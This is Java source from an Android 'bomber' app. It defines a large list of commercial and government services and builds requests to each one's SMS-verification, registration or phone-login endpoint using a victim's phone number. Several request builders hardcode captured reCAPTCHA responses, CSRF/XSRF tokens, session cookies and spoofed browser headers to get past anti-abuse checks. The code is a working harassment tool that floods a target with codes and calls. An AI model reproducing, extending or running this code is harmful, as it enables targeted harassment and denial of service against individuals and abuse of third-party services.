package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.Headers;
import okhttp3.HttpUrl;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class Services {
    public final static Service[] services = {
            new GloriaJeans(), new Telegram(), new MTS(), new CarSmile(),
            new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
            new Ukrzoloto(), new Olltv(), new Wink(), new ProstoTV(),
            new Zdravcity(), new Robocredit(), new Tinder(), new Groshivsim(),
            new Hoff(), new Dolyame(), new Gorparkovka(), new Tinkoff(),
            new MegaDisk(), new KazanExpress(), new FoodBand(), new Gosuslugi(),
            new Citimobil(), new HHru(), new TikTok(), new Multiplex(),
            new Ozon(), new MFC(), new EKA(), new OK(), new MBK(),
            new VKWorki(), new Magnit(), new SberZvuk(), new Smotrim(),
            new BApteka(), new HiceBank(), new Evotor(), new Sportmaster(),
            new GoldApple(), new FriendsClub(), new ChestnyZnak(),
            new MoeZdorovie(), new Sokolov(), new Boxberry(), new Discord(),
            new NearKitchen(), new Citydrive(), new Metro(), new RabotaRu(),
            new Mozen(), new MosMetro(), new BCS(), new Dostavista(),
            new Mokka(), new Stolichki(), new Mirkorma(), new TochkaBank(),
            new Uchiru(), new Biua(), new MdFashion(), new RiveGauche(),
            new XtraTV(), new AlloUa(), new Rulybka(), new Velobike(),
            new Technopark(), new Call2Friends(), new Ievaphone(), new WebCom(),
            new MTSBank(), new ATB(), new Paygram(), new Tele2(),
            new SravniMobile(), new TeaRU(), new PetStory(), new Profi(),
            new BeriZaryad(), new PrivetMir(), new CardsMobile(), new Labirint(),
            new CallMyPhone(), new SberMobile(), new YandexTips(), new Meloman(),
            new Choco(), new AptekaOtSklada(), new Dodopizza(), new AutoRu(),
            new SatUa(), new VapeZone(), new TakeEat(), new BibiSushi(),
            new Melzdrav(), new Fonbet(), new Stroyudacha(), new Grilnica(),
            new Trapezapizza(), new Aitu(), new Pizzaman(), new VSK(),
            new Soscredit(), new ChernovtsyRabota(), new Eva(), new Apteka(),
            new Kari(), new Modulebank(),

            new ParamsService("https://findclone.ru/register") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", getFormattedPhone());
                }
            },

            new ParamsService("https://www.citilink.ru/registration/confirm/phone/+") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addPathSegment(getFormattedPhone() + "/");
                }
            },

            new Service() {
                private final String url = "https://site-api.mcdonalds.ru/api/v1/user/login/phone";
                private final Headers headers = new Headers.Builder()
                        .add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0")
                        .build();

                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url(url)
                            .headers(headers)
                            .method("OPTIONS", null)
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("number", "+" + getFormattedPhone());
                                json.put("g-recaptcha-response", "03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V");
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            client.newCall(new Request.Builder()
                                    .url(url)
                                    .headers(headers)
                                    .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                    .build()).enqueue(callback);
                        }
                    });
                }
            },

            new FormService("https://hotkitchen-delivery.ru/user_account/ajax5sf257.php?do=sms_code", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "8(***)***-**-**"));
                }
            },

            new FormService("https://polza.diet/sessions", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("utf8", "✓");
                    builder.add("authenticity_token", "RDB0iQ+dXYBLIvabyeAnf2fYEYnaMoMwINvwl/CS6HRz467tucU+kT6I7QTl7aWebeX8Gqtg48NYUUif1NJL9g==");
                    builder.add("phone", format(phone, "+7+(***)+***+**+**"));
                }
            },


            new JsonService("https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("login", getFormattedPhone());
                        json.put("password", "");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://oauth.av.ru/check-phone", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("X-XSRF-TOKEN", "eyJpdiI6ImsxRkJrRlZCaVpKRVwvbVQ4MVFvQXB3PT0iLCJ2YWx1ZSI6ImJhTmVDYzVMVFZGc0x4b29WXC9GbERlTjhZeGFtWXExU2RXWFFKYU1WcXR5cnVwVllERlpKUVFSdXNya2NlK0x5IiwibWFjIjoiMDk1MDUwZGY1OTA4ZjA0NzIwYmExMWZjMjI0OTY2OWRkOWZhMzA4NTA2ZDFlMTMxN2UzN2Y4MGYwODM5MDhhNSJ9");
                    builder.addHeader("X-CSRF-TOKEN", "1Z3KKbbDSRbhxw6ZbLVRWcmwVMIPKXej12lzJzbZ");
                    builder.addHeader("X-Ajax-Token", "5592b90ee98edbba757b233367431ad8e130b84cbeb2599262f0ebf957f36b68");
                    builder.addHeader("Cookie", "XSRF-TOKEN=eyJpdiI6ImsxRkJrRlZCaVpKRVwvbVQ4MVFvQXB3PT0iLCJ2YWx1ZSI6ImJhTmVDYzVMVFZGc0x4b29WXC9GbERlTjhZeGFtWXExU2RXWFFKYU1WcXR5cnVwVllERlpKUVFSdXNya2NlK0x5IiwibWFjIjoiMDk1MDUwZGY1OTA4ZjA0NzIwYmExMWZjMjI0OTY2OWRkOWZhMzA4NTA2ZDFlMTMxN2UzN2Y4MGYwODM5MDhhNSJ9; laravel_session=eyJpdiI6IlkxaWo2T1A3N3YxRVdWTXVPZlVrK3c9PSIsInZhbHVlIjoiNVV4Q2xpNWZqc0xZM2xLWVwvQlZDaDRLTnBsek55VU9PZVR4b2tZQ1IwZGhCNjBuM2JKZksxdW5hZkl5Mno3YWEiLCJtYWMiOiIwZGI1YWY0MDlkMThmYmVhMjY3OWYyNDE2NGNkMjNkY2RlMDhiOGFmYjYxN2FjOTNmZjUzMmJmNDBkMjViYThhIn0%3D; session-cookie=16bc57cb02c5bcb3cb1a64b9b4819f5bd9e22f03393befd1a63c45fc465f0f8c3e8caa34700c46c53b462402658dd41e; font=phone");
                    builder.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0");
                    builder.addHeader("Referer", "https://oauth.av.ru/");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7 (***) ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://shop.vodovoz-spb.ru/bitrix/tools/ajax_sms.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new JsonService("https://api.ecomarket.ru/api.php", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("action", "doRegisterOrRecover");
                        json.put("phone", format(phone, "+7-***-***-**-**"));
                        json.put("source", "web");
                        json.put("type", "call");
                        json.put("token", "bb1a2f29c78164dfb490dbae44594318");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            }
    };
}
